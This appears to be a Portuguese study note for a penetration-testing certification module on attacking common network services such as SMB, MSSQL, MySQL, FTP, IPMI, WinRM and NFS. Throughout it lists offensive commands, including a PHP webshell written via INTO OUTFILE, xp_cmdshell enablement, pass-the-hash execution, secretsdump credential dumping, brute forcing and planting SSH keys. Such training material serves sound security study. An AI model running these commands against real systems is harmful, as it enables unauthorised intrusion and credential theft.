---
tema: Serviços Comuns
tópico: Ataque a serviços de rede e protocolos corporativos
tags: [htb, cpts, ftp, smb, mssql, mysql, rdp, dns, smtp, ipmi, winrm, ssh, nfs]
dificuldade: medium
---

# CPTS 11 — Attacking Common Services

> [!info] Objetivo
> Enumeração e exploração dos serviços que aparecem em praticamente todo engajamento interno: FTP, SMB, SQL, RDP, DNS, SMTP, IPMI, WinRM, SSH, NFS e R-services. A ideia central é **acumular credenciais** — cada serviço é uma fonte de usuários, hashes ou shells.

## 🎯 Quando usar

- Depois do scan de portas: você tem a lista de serviços e precisa transformar "porta aberta" em acesso.
- Quando aparece autenticação anônima/guest em qualquer protocolo (FTP, SMB, LDAP, NFS).
- Quando precisa mover de "usuário de domínio" para "execução remota" (SMB/WinRM/MSSQL).
- Reaproveitamento de credenciais: o mesmo par usuário/senha costuma abrir 2–3 serviços.

## 🧰 Ferramentas

| Ferramenta | Uso principal |
|---|---|
| `nmap` / `nxc` (netexec) | Enumeração rápida e validação de credenciais |
| `ftp`, `lftp` | Interação com FTP |
| `smbclient`, `smbmap`, `rpcclient` | Enumeração SMB |
| `*.py` (impacket) | `psexec`, `smbexec`, `wmiexec`, `atexec`, `mssqlclient`, `secretsdump` |
| `mysql`, `mssql-cli` | Clientes SQL |
| `ipmitool` | BMC/IPMI |
| `evil-winrm` | Shell WinRM |
| `swaks` | Teste SMTP |
| `hashcat` | Quebra de hashes (modo 7300 = IPMI) |

## 🌐 FTP (21)

| Comando | O que faz |
|---|---|
| `ftp <IP>` | Login interativo (teste `anonymous:anonymous`) |
| `lftp -u <USUARIO>,<SENHA> <IP>` | Sessão com credenciais, suporta `mirror` |
| `lftp -u anonymous, <IP> -e "set passive-mode on; ls; bye"` | Listagem anônima one-shot |

```bash
# Teste anônimo — se listar, procure backups, .ssh, configs
ftp <IP>
# usuário: anonymous / senha: (vazia)

# Download recursivo do que for acessível
lftp -u anonymous, <IP> -e "mirror . /tmp/ftp_dump; bye"

# Upload de webshell quando o diretório casa com o webroot
put shell.php
```

**Quando usar:** FTP costuma expor backups de site (que revelam credenciais de banco) e diretórios `.ssh` com chaves privadas.

## 📁 SMB (445/139)

```bash
# Sessão nula / guest
smbclient -N -L //<IP>                    # lista shares sem credencial
smbclient -N //<IP>/<SHARE>
smbmap -H <IP> -u guest -p ''            # permissões por share (R/W)
nxc smb <IP> -u '' -p '' --shares        # tudo de uma vez, com anon

# Com credenciais
nxc smb <IP> -u <USUARIO> -p <SENHA> --shares --sessions --loggedon-users
smbclient //<IP>/<SHARE> -U <USUARIO>%<SENHA>

# Enumeração de usuários/domínio via RPC
rpcclient -U "" -N <IP>        # depois: enumdomusers / enumdomgroups / querydominfo
```

### Execução remota via SMB (Impacket)

| Ferramenta | Mecanismo | Observação |
|---|---|---|
| `psexec.py` | Cria serviço + binário | Escreve em `ADMIN$`; gera alerta, mas é estável |
| `smbexec.py` | Serviço com `cmd.exe /Q` | Menos artefatos em disco, output por arquivo temporário |
| `wmiexec.py` | WMI | Não grava binário; ótimo em ambiente monitorado |
| `atexec.py` | Task Scheduler | Executa como SYSTEM, sem sessão interativa |

```bash
# Sintaxe comum — hash NTLM também funciona no lugar da senha
psexec.py <DOMINIO>/<USUARIO>:<SENHA>@<IP>
wmiexec.py <DOMINIO>/<USUARIO>@<IP> -hashes :<HASH>
atexec.py <DOMINIO>/<USUARIO>:<SENHA>@<IP> "whoami /all"

# Dump de SAM/LSA (requer admin local)
secretsdump.py <DOMINIO>/<USUARIO>:<SENHA>@<IP>
```

> [!warning] Requisito
> Todos precisam de admin local no alvo (ou `SeImpersonate`/admin de domínio). `nxc smb <IP> -u u -p p` retornando `Pwn3d!` confirma isso.

## 🐬 MySQL (3306)

```bash
# Login remoto; -h é obrigatório para não usar socket local
mysql -u <USUARIO> -p'<SENHA>' -h <IP>

# Enumeração dentro do banco
SELECT version(), user(), @@hostname;
SHOW DATABASES; USE <DB>; SHOW TABLES;
SELECT * FROM users LIMIT 5;

# Escrita de arquivo (se FILE privilege e secure_file_priv vazio)
SELECT "<?php system($_GET['c']); ?>" INTO OUTFILE '/var/www/html/s.php';
```

```bash
# Força bruta de senha do root
hydra -l root -P ~/wordlists/rockyou.txt mysql://<IP>
```

**Quando usar:** `--os-shell` do sqlmap é caminho rápido quando o usuário tem `FILE` e `INSERT`. Sem isso, foque em dump de credenciais para reuso.

## 🟦 MSSQL (1433)

```bash
# Cliente Impacket — melhor que o sqlcmd para pentest
mssqlclient.py <DOMINIO>/<USUARIO>:<SENHA>@<IP> -windows-auth
mssqlclient.py <USUARIO>@<IP> -hashes :<HASH>
```

```sql
-- Recon básico
SELECT @@version; SELECT SYSTEM_USER; SELECT IS_SRVROLEMEMBER('sysadmin');
SELECT name FROM sys.databases;

-- Habilitar e usar xp_cmdshell (precisa sysadmin)
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';

-- Impersonation: executar como outro login com privilégio
SELECT DISTINCT b.name FROM sys.server_permissions a
  JOIN sys.server_principals b ON a.grantee_principal_id = b.principal_id
  WHERE a.permission_name = 'IMPERSONATE';
EXECUTE AS LOGIN = 'sa'; SELECT SYSTEM_USER; EXEC xp_cmdshell 'whoami';

-- Linked servers: pivotar para outra instância
SELECT * FROM sys.servers;
EXEC ('SELECT SYSTEM_USER') AT [<SERVIDOR_LINKADO>];
```

**Quando usar:** `xp_cmdshell` é o caminho mais direto para shell quando você é `sysadmin`; impersonation e linked servers são o pulo do gato em ambientes segmentados.

## 🖥️ RDP (3389)

```bash
# Teste de credencial sem abrir GUI
nxc rdp <IP> -u <USUARIO> -p <SENHA>

# Conexão
xfreerdp /v:<IP> /u:<USUARIO> /p:<SENHA> /dynamic-resolution +clipboard /drive:shared,/tmp

# Sessão com pass-the-hash (Restricted Admin Mode habilitado)
xfreerdp /v:<IP> /u:<USUARIO> /pth:<HASH> /dynamic-resolution
```

**Quando usar:** RDP é o alvo final em muitos labs (flag no Desktop). Se credencial válida mas sem grupo Remote Desktop Users, procure `xfreerdp` com outro usuário ou escalar local.

## 📡 DNS (53)

```bash
# Transferência de zona — clássico e ainda frequente
dig AXFR <DOMINIO> @<IP>
nslookup -type=NS <DOMINIO> <IP>

# Enumeração de subdomínios internos
dnsenum <DOMINIO>
fierce --domain <DOMINIO>

# Força bruta de nomes
for sub in $(cat /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt); do
  host $sub.<DOMINIO> <IP> | grep "has address";
done
```

**Quando usar:** AXFR mal configurado entrega o mapa completo da rede interna de graça.

## ✉️ SMTP (25/465/587)

```bash
# Verificação de usuários (se VRFY/EXPN habilitados)
smtp-user-enum -M VRFY -U users.txt -t <IP>
smtp-user-enum -M EXPN -U users.txt -t <IP>
smtp-user-enum -M RCPT -U users.txt -t <IP>   # mais confiável hoje

# Envio de teste / spoof de remetente
swaks --to <USUARIO>@<DOMINIO> --from ceo@<DOMINIO> --server <IP> \
      --header "Subject: Teste" --body "corpo"
```

**Quando usar:** enumeração de usuários válidos para spraying e teste de relay aberto (`swaks` para destino externo).

## 🔌 IPMI (623/UDP)

```bash
# Identificação e dump de hashes (IPMI 2.0 RAKP)
nmap -sU --script ipmi-version -p623 <IP>
msfconsole -q -x "use auxiliary/scanner/ipmi/ipmi_dumphashes; set RHOSTS <IP>; run"

# Com credenciais padrão/admin
ipmitool -I lanplus -H <IP> -U ADMIN -P admin chassis status
ipmitool -I lanplus -H <IP> -U ADMIN -P admin user list
ipmitool -I lanplus -H <IP> -U ADMIN -P admin mc info

# Quebra do hash RAKP (formato 7300 no hashcat)
hashcat -m 7300 ipmi.hash ~/wordlists/rockyou.txt
```

**Quando usar:** BMC exposto na rede é quase sempre senha padrão e dá acesso fora do SO — inclusive desligar a máquina.

## 🪟 WinRM (5985/5986)

```bash
# Validação de credencial
nxc winrm <IP> -u <USUARIO> -p <SENHA>

# Shell interativo
evil-winrm -i <IP> -u <USUARIO> -p <SENHA>
evil-winrm -i <IP> -u <USUARIO> -H <HASH>

# Upload/download dentro da sessão
upload /tmp/SharpHound.exe C:\Windows\Temp\SharpHound.exe
download C:\Users\<USUARIO>\Desktop\flag.txt
```

**Quando usar:** WinRM é mais limpo que psexec (sem criar serviço) e funciona com hash. Requer usuário no grupo `Remote Management Users` ou admin.

## 🐧 SSH (22)

```bash
# Senha
ssh <USUARIO>@<IP>
hydra -l <USUARIO> -P ~/wordlists/rockyou.txt ssh://<IP>

# Chave privada encontrada em NFS/FTP
chmod 600 id_rsa
ssh -i id_rsa <USUARIO>@<IP>

# Chave protegida por passphrase
ssh2john id_rsa > id_rsa.hash
john --wordlist=~/wordlists/rockyou.txt id_rsa.hash

# Reuso de chave entre hosts
ssh -i id_rsa -o StrictHostKeyChecking=no <USUARIO>@<IP-INTERNO>
```

**Quando usar:** chave privada achada em qualquer serviço é passe livre; teste também `authorized_keys` gravável.

## 🗄️ NFS (2049)

```bash
# Listar exports e permissões
showmount -e <IP>
nmap -p111,2049 --script nfs-ls,nfs-showmount,nfs-statfs <IP>

# Montar e explorar (root_squash desabilitado = root real)
mkdir -p /mnt/nfs && sudo mount -t nfs <IP>:/<EXPORT> /mnt/nfs -o nolock
ls -la /mnt/nfs
# Escrever chave em home exportado
cat ~/.ssh/id_rsa.pub >> /mnt/nfs/<USUARIO>/.ssh/authorized_keys
```

**Quando usar:** `no_root_squash` permite criar binário SUID e escalar; exports abertos costumam conter backups e chaves.

## 🔓 R-services (512/513/514)

```bash
# Login remoto legado (rsh/rexec/rlogin)
rlogin -l <USUARIO> <IP>
rsh <IP> -l <USUARIO> id
rexec <IP> -l <USUARIO> -p <SENHA> id

# Scanner
nmap -p512,513,514 --script rservices-info <IP>
```

**Quando usar:** sistemas Unix antigos com `.rhosts` confiando em `+` permitem login sem senha. Raro, mas custa 30 segundos testar.

## ⚠️ Pegadinhas

- **`Pwn3d!` não é shell.** `nxc` marcando admin local ainda exige escolher o vetor (psexec cria serviço, wmiexec não).
- **`secretsdump` remoto precisa de admin**; sem isso, use `-just-dc-user` só após DCSync rights.
- **MSSQL `xp_cmdshell` roda como a conta do serviço**, não SYSTEM. Verifique `whoami` antes de celebrar.
- **`secure_file_priv` no MySQL** bloqueia `INTO OUTFILE`; cheque `SHOW VARIABLES LIKE 'secure_file_priv'`.
- **IPMI 2.0 exposto vaza hash mesmo sem senha** — mas o hash só quebra se a senha for fraca.
- **SMB signing** desabilitado é requisito para relay; confirme com `nxc smb --gen-relay-list`.
- **NFS `root_squash`** transforma root em `nobody`; sem `no_root_squash`, SUID não funciona.
- Não confunda shares de leitura com escrita: `smbmap` mostra `READ,WRITE`, mas ACL no NTFS pode negar.

## ✅ Checklist rápido

- [ ] `nmap -sV -sC -p- <IP>` + `nxc smb/winrm/rdp/mssql` na sequência
- [ ] Testar null/guest em SMB, FTP anônimo, NFS exports
- [ ] `rpcclient` para usuários e grupos; montar lista para spraying
- [ ] Reusar toda credencial encontrada em todos os serviços
- [ ] SQL: testar `sysadmin`, impersonation e linked servers
- [ ] Verificar `Pwn3d!` e escolher vetor de execução silencioso
- [ ] Procurar arquivos sensíveis em shares (`*.config`, `id_rsa`, backups)
- [ ] Documentar cada credencial com origem e validade

## 🔗 Relacionado

- [[CPTS 04 - Footprinting]]
- [[CPTS 10 - Password Attacks]]
- [[Fase 04 - Enumeração de Serviços]]
- [[Fase 09 - Active Directory]]
- [[CPTS 12 - Pivoting, Tunneling, and Port Forwarding]]
